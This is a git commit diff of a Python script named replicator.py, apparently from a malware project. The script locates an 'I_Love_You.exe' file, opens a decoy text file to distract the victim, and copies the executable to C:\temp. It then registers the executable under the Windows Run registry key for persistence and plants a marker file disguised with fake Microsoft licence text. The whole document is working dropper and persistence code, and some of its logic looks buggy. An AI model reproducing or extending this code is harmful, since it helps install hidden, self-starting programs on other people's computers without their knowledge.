e72eb3014775a3b9c569c1ac6c7b42b14f6c946e
Pedro Vieira <pedrovieira3333@hotmail.com>
2019-04-01 22:55:31 +0100

    Performing changes for Alpha release

--- Windows/replicator.py
+++ Windows/replicator.py
@@ -4,14 +4,15 @@ import subprocess
 from shutil import copy
 from winreg import *
 
-path = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
-filePath = 'C:\\temp\\Key.log'
+path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
+filePath = 'C:\\temp\\I_Love_You.exe'
 dst = 'C:\\temp'
+admin = 'asdmin'
 
 
 # Searchs the whole computer for the file
-def finder(name, path):
-    for root, dirs, files in os.walk( path ):
+def finder(name, pathS):
+    for root, dirs, files in os.walk( pathS ):
         if name in files:
             global pathF, pathB
             pathB = os.path.join( root )
@@ -19,53 +20,79 @@ def finder(name, path):
             return os.path.join( root, name )
 
 
-finder( 'I_Love_You_Text.exe', 'C:\\' )
+def cleaner(name, pathC):
+    for root, dirs, files in os.walk( pathC ):
+        try:
+            if name not in files:
+                CleanerRegistry = os.path.join( root, name )
+                print( CleanerRegistry )
+
+                # Creates the decoy file
+                with open( pathDecoy, 'w' ) as file:
+                    file.write( '<3' )
+                    file.close()
+
+                try:
+                    copy( src, dst )
+                    print( '[!] File Copied to safe place' )
+                except OSError as E:
+                    print( '[!] Exception: ', str( E ) )
+
+                # Opens Decoy File when parent script clicked
+                if platform.system() == 'Windows':  # Windows
+                    os.startfile( pathDecoy )
+                elif platform.system() == 'Darwin':  # MacOS
+                    subprocess.Popen( ['start', pathDecoy] )
+                else:  # Linux
+                    subprocess.Popen( ['xdg-open', pathDecoy] )
+
+                    # Windows only
+                    # Try stock access rights with 64bits program to 64bit registry
+                try:
+                    key = OpenKey( HKEY_CURRENT_USER, path, 0, access=KEY_ALL_ACCESS )
+                    SetValueEx( key, 'Registry', 0, REG_SZ, filePath )  # Registry == name of the sub_key to open
+                    CloseKey( key )
+                except FileNotFoundError:
+
+                    bits = platform.architecture()[0]
+
+                    # https://docs.microsoft.com/en-us/windows/desktop/WinProg64/accessing-an-alternate-registry-view
+                    if bits == '32bits':
+                        access_right = KEY_WOW64_64KEY
+                    if bits == '64bits':
+                        access_right = KEY_WOW64_32KEY
+                    try:
+                        key = OpenKey( HKEY_CURRENT_USER, path, 0, access=KEY_ALL_ACCESS | access_right )
+                        SetValueEx( key, 'Registry', 0, REG_SZ, filePath )
+                        CloseKey( key )
+                    except Exception as e:
+                        print( '[!] Exception: %s' % str( e ) )
+
+                # os.remove(pathF)
+        except FileNotFoundError:
+            print( '[!] File not found.' )
+
+
+finder( 'I_Love_You.exe', 'C:\\' )
 
 src = pathF
-pathDecoy = os.path.join( pathB, 'I_Love_You_Text.txt' )
+pathDecoy = os.path.join( pathB, 'I_Love_You.txt' )
+pathCleanerIdentity = os.path.join( dst, 'CleanerRegistry.log' )
 
-# Crates the decoy file
-with open( pathDecoy, 'w' ) as file:
-    file.write( '<3' )
+cleaner( 'CleanerRegistry.log', 'C:\\temp' )
+
+# Creates one file that will be trigger a cleaner function
+with open( pathCleanerIdentity, 'w' ) as file:
+    file.write(
+            'This file is based on or incorporates material from the projects listed below\n'
+            '(collectively, Third Party Code). Microsoft is not the original author of the\n'
+            'Third Party Code. The original copyright notice and the license, under which Microsoft\n'
+            'received such Third Party Code, are set forth below. Such licenses and notices are\n'
+            'provided for informational purposes only. Microsoft, not the third party, licenses\n'
+            'the Third Party Code to you under the terms set forth in the EULA for the Microsoft Product.\n'
+            'Microsoft reserves all other rights not expressly granted under this agreement, whether by implication,\n'
+            'estoppel or otherwise.'
+    )
+    file.flush()
     file.close()
 
-# Opens Decoy File when parent script clicked
-if platform.system() == 'Windows':  # Windows
-    os.startfile( pathDecoy )
-elif platform.system() == 'Darwin':  # MacOS
-    subprocess.Popen( ['start', pathDecoy] )
-else:  # Linux
-    subprocess.Popen( ['xdg-open', pathDecoy] )
-
-# Copy file on startup to C:\Windows
-try:
-    copy( src, dst )
-    print( 'Done' )
-except OSError as E:
-    print( 'Exception: ', str( E ) )
-    
-# Windows only
-# Try stock access rights with 64bits program to 64bit registry
-try:
-    key = OpenKey( HKEY_CURRENT_USER, path, 0, access=KEY_SET_VALUE )
-    SetValue( key, 'Registry', REG_SZ, filePath )  # Registry == name of the sub_key to open
-    CloseKey( key )
-except FileNotFoundError:
-    import platform
-
-    bits = platform.architecture()[0]
-
-    # Detects the bitness of the computer and gives the proper additional right access
-    # https://docs.microsoft.com/en-us/windows/desktop/WinProg64/accessing-an-alternate-registry-view
-    if bits == '32bits':
-        bits_access_right = KEY_WOW64_64KEY
-    elif bits == '64bits':
-        bits_access_right = KEY_WOW64_32KEY
-
-    try:
-        key = OpenKey( HKEY_CURRENT_USER, path, 0, access=KEY_SET_VALUE | bits_access_right )
-        SetValue( key, 'registry', REG_SZ, filePath )
-        CloseKey( key )
-    except Exception as e:
-        print( 'Excepetion: %s' % str( e ) )
-        
